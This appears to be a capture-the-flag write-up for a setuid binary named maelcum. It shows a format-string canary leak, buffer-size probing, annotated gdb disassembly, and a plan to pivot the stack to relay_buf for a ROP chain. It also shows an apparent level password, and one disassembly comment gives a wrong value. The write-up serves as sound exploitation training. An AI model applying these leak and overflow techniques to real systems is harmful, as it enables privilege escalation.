# Level 08

s3cgzrg5q78t6xx73ljvm3m2zfwk02ix

## Description

```
ls -l
total 20
-rwsr-x--- 1 flag08 level08 16792 Jun  9 23:13 maelcum
```

Once again, no source code.

This time let's use the `checksec` tool to discover how is the program protected :

```
checksec maelcum
[*] '/home/level08/maelcum'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Once again, there are stack canaries and non executable stack.

## checksec program

### Printf format and buffer overflow

```
echo '%6$p %7$p %8$p %9$p %10$p %11$p %12$p %13$p %14$p %15$p %16$p %17$p %18$p %19$p %20$p %21$p %22$p %23$p %24$p %25$p' | env -i /home/level08/maelcum
```

Output :

```
$ echo '%6$p %7$p %8$p %9$p %10$p %11$p %12$p %13$p %14$p %15$p %16$p %17$p %18$p %19$p %20$p %21$p %22$p %23$p %24$p %25$p' | env -i /home/level08/maelcum

...
[MAELCUM] Tag this relay (who's asking?): [MAELCUM] Logging relay tag: (nil) 0x3f 0x2437252070243625 0x2520702438252070 0x2430312520702439 0x2070243131252070 0x3125207024323125 0x2434312520702433 0x2070243531252070 0x25207024363125 (nil) %
...
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

That tells us 2 things:
- we can use a printf format exploit
- there is an exploitable buffer overflow somewhere

Let's find out the size of the buffer for the first read:
```
printf "%0.sa" {1..104}  | env -i /home/level08/maelcum => STACK SMASH
printf "%0.sa" {1..96}  | env -i /home/level08/maelcum => OK
```

The printed tag is actually `63 bytes`, so the buffer is probably `0x40` bytes.

Let's find out the size of the buffer for the second read :

```
(gdb) disas relay_data 
Dump of assembler code for function relay_data:
   0x00000000004015a7 <+0>:	endbr64
   0x00000000004015ab <+4>:	push   %rbp
   0x00000000004015ac <+5>:	mov    %rsp,%rbp
   0x00000000004015af <+8>:	sub    $0x40,%rsp
   0x00000000004015b3 <+12>:	mov    %fs:0x28,%rax
   0x00000000004015bc <+21>:	mov    %rax,-0x8(%rbp)
   0x00000000004015c0 <+25>:	xor    %eax,%eax
...
   0x00000000004015e5 <+62>:	lea    -0x30(%rbp),%rax
   0x00000000004015e9 <+66>:	mov    $0x40,%edx
   0x00000000004015ee <+71>:	mov    %rax,%rsi
   0x00000000004015f1 <+74>:	mov    $0x0,%edi
   0x00000000004015f6 <+79>:	call   0x401160 <read@plt>
```

The buffer should normally be `0x20` bytes (`0x30 - 0x10` taking the stack canary into account).

However, the read is wrong :
- it reads 0x40 bytes instead of 0x20. That means we can overflow the buffer by `0x20` bytes, that includes the stack canary + the return address.

This first read is vulnerable to printf flag format, so we can first display the stack canary and then perform the stack overflow using the correct canary.

However, we are short on space for the ROP chain (it needs at least 64 bytes).

We could store it in the first buffer but then we would not have enough space to display the stack canary.

As a ROP chain contains null byte, it cannot be stored in the program argument or in the env.

So we need to find another solution:

### Analysing the `relay_data` function

```
Dump of assembler code for function relay_data:
   0x00000000004015a7 <+0>:	endbr64
   0x00000000004015ab <+4>:	push   %rbp
   0x00000000004015ac <+5>:	mov    %rsp,%rbp
   0x00000000004015af <+8>:	sub    $0x40,%rsp
... Canary initialization
... Printf call
   0x00000000004015e5 <+62>:	lea    -0x30(%rbp),%rax
   0x00000000004015e9 <+66>:	mov    $0x40,%edx
   0x00000000004015ee <+71>:	mov    %rax,%rsi
   0x00000000004015f1 <+74>:	mov    $0x0,%edi
   0x00000000004015f6 <+79>:	call   0x401160 <read@plt>
   0x00000000004015fb <+84>:	lea    -0x30(%rbp),%rax
   0x00000000004015ff <+88>:	mov    $0x6,%edx
   0x0000000000401604 <+93>:	lea    0xabc(%rip),%rcx        # 0x4020c7
   0x000000000040160b <+100>:	mov    %rcx,%rsi
   0x000000000040160e <+103>:	mov    %rax,%rdi
   0x0000000000401611 <+106>:	call   0x401100 <strncmp@plt> # Compare 6 first char with "RELAY:"
   0x0000000000401616 <+111>:	test   %eax,%eax
   0x0000000000401618 <+113>:	jne    0x4016aa <relay_data+259> # return if different
   0x000000000040161e <+119>:	lea    -0x30(%rbp),%rax
   0x0000000000401622 <+123>:	add    $0x6,%rax # &input[6], rest of the chain 
   0x0000000000401626 <+127>:	mov    $0xa,%edx # 3rd arg = 6
   0x000000000040162b <+132>:	mov    $0x0,%esi # 2nd arg = 0
   0x0000000000401630 <+137>:	mov    %rax,%rdi # 1st arg = "..." (after "RELAY:")
   0x0000000000401633 <+140>:	call   0x401180 <strtoul@plt>
   0x0000000000401638 <+145>:	mov    %eax,-0x34(%rbp) # result to stack
   0x000000000040163b <+148>:	cmpl   $0x1ff,-0x34(%rbp) # compare against 511
   0x0000000000401642 <+155>:	ja     0x4016b9 <relay_data+274> # if above, return
...
   0x000000000040166c <+197>:	mov    -0x34(%rbp),%eax # 2nd arg => read of parsed integer
   0x000000000040166f <+200>:	mov    %rax,%rdx
   0x0000000000401672 <+203>:	lea    0x2b87(%rip),%rax        # 0x404200 <relay_buf>
   0x0000000000401679 <+210>:	mov    %rax,%rsi
   0x000000000040167c <+213>:	mov    $0x0,%edi
   0x0000000000401681 <+218>:	call   0x401160 <read@plt> # read to relay_buf
... 
... canary check
   0x00000000004016ce <+295>:	leave
   0x00000000004016cf <+296>:	ret
End of assembler dump.
```

The second prompt of the function actually expects RELAY:[len] before prompting another prompt to store len characters to `relay_buf[]`. Maximum allowed len is `511` bytes, and indeed the relay buf is 512 bytes long :

```
nm -n maelcum | grep -A 2 relay_buf
0000000000404200 b relay_buf
0000000000404400 b relay_len
0000000000404408 B _end
```

## The exploit

1. read canary using printf `%17$p`
2. overflow the stack canary and $rbp saved frame with the address of `relay_buf`: `0x404200`
3. input the ROP chain into relay_buf
